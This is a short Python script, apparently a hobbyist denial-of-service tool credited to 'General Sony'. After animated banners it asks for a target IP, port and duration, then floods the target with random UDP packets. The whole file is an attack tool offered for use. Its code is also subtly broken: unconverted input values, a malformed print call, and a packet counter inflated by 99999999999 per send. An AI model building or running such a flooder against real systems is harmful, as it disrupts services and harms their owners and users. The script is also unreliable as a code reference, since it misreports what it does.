import os
import sys
import time
import socket
import random
from time import sleep

s='[+]Coded By General Sony[+]'
for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep (10. /90)
s='[+]Beta Version!!![+]'
for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep (10. /90)
s='[~]https://www.facebook.com/GeneralSony666[~]'
for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep (10. /90)
s='Version : 0.1'
for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep (10. /90)
    s='[+]Coded By Scream (General Sony)[+]'
for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep (10. /90)
    time.sleep(5)
    s='[+]Thanks Islam Ramadan[+]'
for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep (10. /90)
    
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("clear")
print ("\033[5;49mDDoS Tool By [NONScream](General Sony)")
print (" ")
ip =input("Target IP: ")
port = input("Port: ")
dur= input("Time: ")
timeout = time.time() + dur
sent = 0

while True:
        try:
                if time.time() > timeout:
                        break
                else:
                        pass
                sock.sendto(bytes,(ip, port))
                sent = sent + 99999999999
                print("Sending %s Packets To %s Via Port %s") , sent, ip, port
        except KeyboardInterrupt:
               sys.exit()